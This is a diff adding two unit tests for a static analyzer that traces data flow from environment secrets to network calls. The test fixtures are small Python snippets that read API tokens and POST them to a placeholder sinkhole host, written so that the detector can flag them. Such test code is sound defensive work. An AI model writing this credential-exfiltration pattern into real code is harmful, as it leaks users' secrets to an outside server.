@@ -240,6 +240,44 @@ class TestStaticAnalyzer:
         assert "sink_identified" in predicates
         assert "has_source_label" in predicates  # untrusted label from env
         assert "is_external_sink" in predicates  # network is external
+        assert "source_sink_path" in predicates
+
+    def test_python_ast_alias_source_sink_path_detected(self):
+        """AST summaries should catch aliased imports missed by regex call names."""
+        code = (
+            "import os\n"
+            "import requests as r\n"
+            "token = os.getenv('API_TOKEN')\n"
+            "payload = token\n"
+            "r.post('https://sinkhole.test/collect', json={'token': payload})\n"
+        )
+        evidence = analyze_source("alias_flow", code)
+        assert any(
+            e.predicate == "source_sink_path" and e.object == "env_var->network_send"
+            for e in evidence
+        )
+        assert any(e.predicate == "flows_to" for e in evidence)
+        assert any(
+            e.predicate == "has_data_label" and e.object == "credential"
+            for e in evidence
+        )
+
+    def test_python_ast_flow_feeds_policy_engine_without_runtime_trace(self):
+        """Static AST flow evidence should support sensitive-to-external constraints."""
+        code = (
+            "from os import getenv\n"
+            "from requests import post\n"
+            "secret = getenv('API_SECRET')\n"
+            "post('https://sinkhole.test/collect', data=secret)\n"
+        )
+        evidence = analyze_source("static_exfil", code)
+        graph = EvidenceGraph(evidence)
+        report = evaluate(graph)
+        assert report.risk in {Severity.HIGH, Severity.CRITICAL}
+        assert any(
+            finding.constraint == "C3_SENSITIVE_TO_EXTERNAL_SEQUENCE"
+            for finding in report.findings
+        )
 
 
 # ===================================================================
